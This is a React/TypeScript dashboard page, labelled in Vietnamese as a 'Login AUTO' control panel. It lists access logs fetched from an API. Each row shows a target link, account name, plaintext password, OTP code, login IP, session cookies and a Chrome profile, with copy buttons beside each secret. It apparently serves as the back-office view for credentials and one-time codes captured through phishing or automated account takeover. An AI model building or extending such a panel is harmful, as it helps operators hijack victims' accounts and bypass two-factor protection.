import React, { useState, useEffect } from 'react';
import styled from 'styled-components';
import { theme } from '../../shared/styles/theme';
import {
  Search as SearchIcon,
  FilterList as FilterIcon,
  ContentCopy as CopyIcon,
  Home as HomeIcon,
} from '@mui/icons-material';
import Card from '@mui/material/Card';
import { Badge, Tooltip } from '../../components/common';
import { presets, fadeIn, slideInUp } from '../../shared/styles/animations';

interface AccessLog {
  id: number;
  timestamp: string;
  link: string;
  account: string;
  password: string;
  otp: string;
  ip: string;
  status: 'approved' | 'success' | 'error' | 'captcha' | 'pending';
  cookies: string;
  chromeProfile?: string;
}

const DashboardContainer = styled.div`
  margin-left: ${theme.layout.sidebarWidth};
  padding: ${theme.spacing.lg};
  min-height: 100vh;
  background: ${theme.colors.background.default};
  animation: ${fadeIn} ${theme.transitions.default};
`;

const Header = styled.div`
  margin-bottom: ${theme.spacing.xl};
  animation: ${slideInUp} ${theme.transitions.default};
`;

const MainTitle = styled.h1`
  font-size: ${theme.typography.fontSize.xxl};
  font-weight: ${theme.typography.fontWeight.bold};
  color: ${theme.colors.text.primary};
  text-align: center;
  margin: 0 0 ${theme.spacing.md};
  background: linear-gradient(45deg, ${theme.colors.primary}, ${theme.colors.info});
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  animation: ${presets.glow};
`;

const SubTitle = styled.h2`
  font-size: ${theme.typography.fontSize.lg};
  font-weight: ${theme.typography.fontWeight.medium};
  color: ${theme.colors.text.secondary};
  margin: 0;
  text-align: center;
  animation: ${fadeIn} ${theme.transitions.default} 0.2s;
`;

const ActionBar = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: ${theme.spacing.lg};
  gap: ${theme.spacing.md};
  animation: ${slideInUp} ${theme.transitions.default} 0.3s;
`;

const SearchBar = styled.div`
  display: flex;
  align-items: center;
  background: ${theme.colors.background.paper};
  border-radius: ${theme.borderRadius.md};
  padding: ${theme.spacing.xs} ${theme.spacing.md};
  flex: 1;
  max-width: 400px;
  transition: all ${theme.transitions.default};
  box-shadow: ${theme.shadows.sm};

  &:focus-within {
    box-shadow: ${theme.shadows.md};
    transform: translateY(-2px);
  }

  input {
    border: none;
    background: none;
    padding: ${theme.spacing.sm};
    font-size: ${theme.typography.fontSize.md};
    color: ${theme.colors.text.primary};
    width: 100%;

    &:focus {
      outline: none;
    }
  }

  svg {
    color: ${theme.colors.text.secondary};
    transition: all ${theme.transitions.default};
  }

  &:focus-within svg {
    color: ${theme.colors.primary};
    transform: scale(1.1);
  }
`;

const ActionButtons = styled.div`
  display: flex;
  gap: ${theme.spacing.sm};
`;

const ActionButton = styled.button<{ variant?: 'primary' | 'secondary' }>`
  display: flex;
  align-items: center;
  gap: ${theme.spacing.xs};
  padding: ${theme.spacing.sm} ${theme.spacing.md};
  border-radius: ${theme.borderRadius.md};
  border: none;
  font-weight: ${theme.typography.fontWeight.medium};
  cursor: pointer;
  transition: all ${theme.transitions.default};
  box-shadow: ${theme.shadows.sm};

  ${props =>
    props.variant === 'primary'
      ? `
    background: ${theme.colors.primary};
    color: white;
    &:hover {
      background: ${theme.colors.info};
      transform: translateY(-2px);
      box-shadow: ${theme.shadows.md};
    }
  `
      : `
    background: ${theme.colors.background.paper};
    color: ${theme.colors.text.primary};
    &:hover {
      background: ${theme.colors.border};
      transform: translateY(-2px);
      box-shadow: ${theme.shadows.md};
    }
  `}

  svg {
    transition: all ${theme.transitions.default};
  }

  &:hover svg {
    transform: scale(1.2);
  }
`;

const Table = styled.table`
  width: 100%;
  border-collapse: separate;
  border-spacing: 0;
  background: ${theme.colors.background.paper};
  border-radius: ${theme.borderRadius.lg};
  overflow: hidden;
  box-shadow: ${theme.shadows.lg};
  animation: ${fadeIn} ${theme.transitions.default} 0.4s;
`;

const TableHeader = styled.thead`
  background: ${theme.colors.background.sidebar};
  color: ${theme.colors.text.white};
`;

const TableRow = styled.tr`
  &:nth-child(even) {
    background: ${theme.colors.background.default};
  }
  &:hover {
    background: ${theme.colors.background.paper};
    box-shadow: 0 2px 8px 0 ${theme.colors.primary}22;
    z-index: 1;
  }
  transition: all ${theme.transitions.default};
`;

const TableCell = styled.td`
  padding: ${theme.spacing.md};
  border-bottom: 1px solid ${theme.colors.border};
  font-size: ${theme.typography.fontSize.sm};
  background: white;
  border-right: 1px solid ${theme.colors.border};
  transition: all ${theme.transitions.default};
  &:first-child {
    border-left: 1px solid ${theme.colors.border};
    border-top-left-radius: ${theme.borderRadius.md};
  }
  &:last-child {
    border-right: 1px solid ${theme.colors.border};
    border-top-right-radius: ${theme.borderRadius.md};
  }
`;

const TableHeaderCell = styled.th`
  padding: ${theme.spacing.md};
  text-align: left;
  font-weight: ${theme.typography.fontWeight.medium};
  background: ${theme.colors.background.sidebar};
  color: ${theme.colors.text.white};
  border-right: 1px solid ${theme.colors.border};
  &:first-child {
    border-left: 1px solid ${theme.colors.border};
    border-top-left-radius: ${theme.borderRadius.md};
  }
  &:last-child {
    border-right: 1px solid ${theme.colors.border};
    border-top-right-radius: ${theme.borderRadius.md};
  }
`;

// eslint-disable-next-line @typescript-eslint/no-unused-vars
const StatusCell = styled(TableCell)`
  display: flex;
  align-items: center;
  gap: ${theme.spacing.xs};
`;

const CopyButton = styled.button`
  background: none;
  border: none;
  color: ${theme.colors.primary};
  cursor: pointer;
  padding: ${theme.spacing.xs};
  display: flex;
  align-items: center;
  transition: all ${theme.transitions.default};
  border-radius: ${theme.borderRadius.sm};

  &:hover {
    color: ${theme.colors.info};
    transform: scale(1.1);
    background: ${theme.colors.background.default};
  }

  svg {
    transition: all ${theme.transitions.default};
  }

  &:hover svg {
    transform: rotate(180deg);
  }
`;

const LoadingContainer = styled.div`
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  background: ${theme.colors.background.default};
  animation: ${fadeIn} ${theme.transitions.default};
`;

const LoadingSpinner = styled.div`
  width: 50px;
  height: 50px;
  border: 3px solid ${theme.colors.background.paper};
  border-radius: 50%;
  border-top-color: ${theme.colors.primary};
  animation: spin 1s linear infinite;
  margin-bottom: ${theme.spacing.lg};

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }
`;

const LoadingText = styled.h2`
  font-size: ${theme.typography.fontSize.lg};
  color: ${theme.colors.text.secondary};
  margin: 0;
  animation: ${fadeIn} ${theme.transitions.default} 0.2s;
`;

const LoadingSubText = styled.p`
  font-size: ${theme.typography.fontSize.md};
  color: ${theme.colors.text.secondary};
  margin: ${theme.spacing.sm} 0 0;
  animation: ${fadeIn} ${theme.transitions.default} 0.4s;
`;

const TableSkeleton = styled.div`
  width: 100%;
  background: ${theme.colors.background.paper};
  border-radius: ${theme.borderRadius.lg};
  overflow: hidden;
  box-shadow: ${theme.shadows.lg};
  animation: ${fadeIn} ${theme.transitions.default} 0.4s;
`;

const SkeletonRow = styled.div`
  display: flex;
  padding: ${theme.spacing.md};
  border-bottom: 1px solid ${theme.colors.border};
  background: ${theme.colors.background.default};
  animation: pulse 1.5s infinite;

  @keyframes pulse {
    0% {
      opacity: 0.6;
    }
    50% {
      opacity: 0.8;
    }
    100% {
      opacity: 0.6;
    }
  }
`;

const SkeletonCell = styled.div<{ width?: string }>`
  height: 20px;
  background: ${theme.colors.background.paper};
  border-radius: ${theme.borderRadius.sm};
  margin-right: ${theme.spacing.md};
  width: ${props => props.width || '100px'};
`;

const StatusBadge = styled.span<{ status: string }>`
  display: inline-flex;
  align-items: center;
  padding: ${theme.spacing.xs} ${theme.spacing.sm};
  border-radius: ${theme.borderRadius.sm};
  font-size: ${theme.typography.fontSize.xs};
  font-weight: ${theme.typography.fontWeight.medium};
  text-transform: uppercase;
  letter-spacing: 0.5px;
  transition: all ${theme.transitions.default};

  ${props => {
    switch (props.status) {
      case 'approved':
        return `
          background-color: ${theme.colors.warning}20;
          color: ${theme.colors.warning};
          border: 1px solid ${theme.colors.warning}40;
        `;
      case 'success':
        return `
          background-color: ${theme.colors.success}20;
          color: ${theme.colors.success};
          border: 1px solid ${theme.colors.success}40;
        `;
      case 'error':
        return `
          background-color: ${theme.colors.error}20;
          color: ${theme.colors.error};
          border: 1px solid ${theme.colors.error}40;
        `;
      case 'captcha':
        return `
          background-color: ${theme.colors.info}20;
          color: ${theme.colors.info};
          border: 1px solid ${theme.colors.info}40;
        `;
      case 'pending':
        return `
          background-color: ${theme.colors.warning}20;
          color: ${theme.colors.warning};
          border: 1px solid ${theme.colors.warning}40;
        `;
      default:
        return `
          background-color: ${theme.colors.text.secondary}20;
          color: ${theme.colors.text.secondary};
          border: 1px solid ${theme.colors.text.secondary}40;
        `;
    }
  }}
`;

const Dashboard: React.FC = () => {
  const [searchTerm, setSearchTerm] = useState('');
  const [filterStatus, setFilterStatus] = useState<AccessLog['status'] | 'all'>('all');
  const [logs, setLogs] = useState<AccessLog[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const fetchLogs = async () => {
      try {
        setIsLoading(true);
        setError(null);
        const response = await fetch('/api/logs');
        if (!response.ok) {
          throw new Error('Failed to fetch logs');
        }
        const data = await response.json();
        setLogs(data);
      } catch (error) {
        console.error('Error fetching logs:', error);
        setError(error instanceof Error ? error.message : 'An error occurred');
      } finally {
        setIsLoading(false);
      }
    };

    fetchLogs();
  }, []);

  const filteredLogs = logs.filter(log => {
    const matchesSearch =
      log.account.toLowerCase().includes(searchTerm.toLowerCase()) ||
      log.ip.toLowerCase().includes(searchTerm.toLowerCase()) ||
      log.link.toLowerCase().includes(searchTerm.toLowerCase());

    const matchesFilter = filterStatus === 'all' || log.status === filterStatus;

    return matchesSearch && matchesFilter;
  });

  const handleSearch = (event: React.ChangeEvent<HTMLInputElement>) => {
    setSearchTerm(event.target.value);
  };

  const handleFilterChange = (status: AccessLog['status'] | 'all') => {
    setFilterStatus(status);
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const getStatusIcon = (status: AccessLog['status']) => {
    switch (status) {
      case 'approved':
        return '🟡';
      case 'success':
        return '✅';
      case 'error':
        return '❌';
      case 'captcha':
        return '🟠';
      case 'pending':
        return '⏳';
      default:
        return '❓';
    }
  };

  const getStatusText = (status: AccessLog['status']) => {
    switch (status) {
      case 'approved':
        return 'Phê Duyệt';
      case 'success':
        return 'Thành Công';
      case 'error':
        return 'Lỗi';
      case 'captcha':
        return 'Captcha';
      case 'pending':
        return 'Đang Xử Lý';
      default:
        return 'Không Xác Định';
    }
  };

  const getBadgeVariant = (status: AccessLog['status']): 'success' | 'error' | 'primary' | 'default' | 'warning' => {
    switch (status) {
      case 'success':
        return 'success';
      case 'error':
        return 'error';
      case 'pending':
        return 'warning';
      case 'captcha':
        return 'primary';
      case 'approved':
        return 'default';
      default:
        return 'default';
    }
  };

  if (isLoading) {
    return (
      <LoadingContainer>
        <LoadingSpinner />
        <LoadingText>Loading Dashboard</LoadingText>
        <LoadingSubText>Please wait while we fetch your data...</LoadingSubText>
        <TableSkeleton>
          {Array.from({ length: 5 }).map((_, index) => (
            <SkeletonRow key={index}>
              <SkeletonCell width="100px" />
              <SkeletonCell width="200px" />
              <SkeletonCell width="150px" />
              <SkeletonCell width="120px" />
              <SkeletonCell width="100px" />
              <SkeletonCell width="120px" />
              <SkeletonCell width="100px" />
              <SkeletonCell width="150px" />
              <SkeletonCell width="120px" />
            </SkeletonRow>
          ))}
        </TableSkeleton>
      </LoadingContainer>
    );
  }

  if (error) {
    return (
      <DashboardContainer>
        <Header>
          <MainTitle>Error</MainTitle>
          <SubTitle>{error}</SubTitle>
        </Header>
        <ActionBar>
          <ActionButton onClick={() => window.location.reload()}>
            Retry
          </ActionButton>
        </ActionBar>
      </DashboardContainer>
    );
  }

  return (
    <DashboardContainer>
      <Header>
        <MainTitle>Bảng Điều Khiển Login AUTO</MainTitle>
        <SubTitle>Danh Sách Lịch Sử Truy Cập</SubTitle>
      </Header>

      <ActionBar>
        <SearchBar>
          <SearchIcon />
          <input
            type="text"
            placeholder="Search by account, IP, or link..."
            value={searchTerm}
            onChange={handleSearch}
          />
        </SearchBar>

        <ActionButtons>
          <ActionButton onClick={() => handleFilterChange('all')}>
            <FilterIcon />
            All
          </ActionButton>
          <ActionButton onClick={() => handleFilterChange('approved')}>
            <FilterIcon />
            Approved
          </ActionButton>
          <ActionButton onClick={() => handleFilterChange('success')}>
            <FilterIcon />
            Success
          </ActionButton>
          <ActionButton onClick={() => handleFilterChange('error')}>
            <FilterIcon />
            Error
          </ActionButton>
          <ActionButton onClick={() => handleFilterChange('captcha')}>
            <FilterIcon />
            Captcha
          </ActionButton>
          <ActionButton onClick={() => handleFilterChange('pending')}>
            <FilterIcon />
            Pending
          </ActionButton>
        </ActionButtons>
      </ActionBar>

      <Card>
        <Table>
          <TableHeader>
            <tr>
              <TableHeaderCell>STT</TableHeaderCell>
              <TableHeaderCell>Thời Gian</TableHeaderCell>
              <TableHeaderCell>Tên Link</TableHeaderCell>
              <TableHeaderCell>Tài Khoản</TableHeaderCell>
              <TableHeaderCell>Mật Khẩu</TableHeaderCell>
              <TableHeaderCell>Code OTP</TableHeaderCell>
              <TableHeaderCell>IP Login</TableHeaderCell>
              <TableHeaderCell>Trạng Thái</TableHeaderCell>
              <TableHeaderCell>Kết Quả</TableHeaderCell>
              <TableHeaderCell>Cookies</TableHeaderCell>
              <TableHeaderCell>Chrome</TableHeaderCell>
            </tr>
          </TableHeader>
          <tbody>
            {filteredLogs.map((log, index) => (
              <TableRow key={log.id}>
                <TableCell>{index + 1}</TableCell>
                <TableCell>{log.timestamp}</TableCell>
                <TableCell>
                  <Tooltip content={log.link}>
                    <span>{log.link}</span>
                  </Tooltip>
                  <CopyButton onClick={() => handleCopy(log.link)}>
                    <CopyIcon />
                  </CopyButton>
                </TableCell>
                <TableCell>
                  <Tooltip content={log.account}>
                    <span>{log.account}</span>
                  </Tooltip>
                  <CopyButton onClick={() => handleCopy(log.account)}>
                    <CopyIcon />
                  </CopyButton>
                </TableCell>
                <TableCell>
                  <Tooltip content={log.password}>
                    <span>{log.password}</span>
                  </Tooltip>
                  <CopyButton onClick={() => handleCopy(log.password)}>
                    <CopyIcon />
                  </CopyButton>
                </TableCell>
                <TableCell>
                  <Tooltip content={log.otp}>
                    <span>{log.otp}</span>
                  </Tooltip>
                  <CopyButton onClick={() => handleCopy(log.otp)}>
                    <CopyIcon />
                  </CopyButton>
                </TableCell>
                <TableCell>
                  <Tooltip content={log.ip}>
                    <span>{log.ip}</span>
                  </Tooltip>
                  <CopyButton onClick={() => handleCopy(log.ip)}>
                    <CopyIcon />
                  </CopyButton>
                </TableCell>
                <TableCell>
                  <StatusBadge status={log.status}>
                    {getStatusIcon(log.status)}
                    {getStatusText(log.status)}
                  </StatusBadge>
                </TableCell>
                <TableCell>
                  <Badge
                    variant={getBadgeVariant(log.status)}
                    content={1}
                    showZero
                  />
                </TableCell>
                <TableCell>
                  <Tooltip content={log.cookies}>
                    <span>{log.cookies}</span>
                  </Tooltip>
                  <CopyButton onClick={() => handleCopy(log.cookies)}>
                    <CopyIcon />
                  </CopyButton>
                </TableCell>
                <TableCell>
                  {log.chromeProfile && (
                    <>
                      <HomeIcon />
                      <span>{log.chromeProfile}</span>
                    </>
                  )}
                </TableCell>
              </TableRow>
            ))}
          </tbody>
        </Table>
      </Card>
    </DashboardContainer>
  );
};

export default Dashboard;